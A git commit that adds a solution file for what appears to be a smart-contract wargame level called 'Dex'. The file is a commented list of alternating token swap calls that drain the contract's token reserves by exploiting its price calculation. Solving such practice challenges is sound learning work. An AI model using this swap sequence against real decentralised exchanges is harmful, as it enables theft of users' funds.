19d05f99a10695a6f5f6d162a7b29c7646e1a909
crypt0n <spencer_clay@foxmail.com>
2022-10-22 17:43:48 +0800

    add Dex

---
+++ Dex/solve.sol
@@ -0,0 +1,14 @@
+/*
+token1 = await contract.token1()
+token2 = await contract.token2()
+
+await contract.swap(token1,token2,10)
+await contract.swap(token2,token1,10)
+await contract.swap(token2,token1,10)
+await contract.swap(token1,token2,21)
+await contract.swap(token2,token1,25)
+await contract.swap(token1,token2,32)
+await contract.swap(token2,token1,45)
+await contract.swap(token1,token2,34)
+
+ */
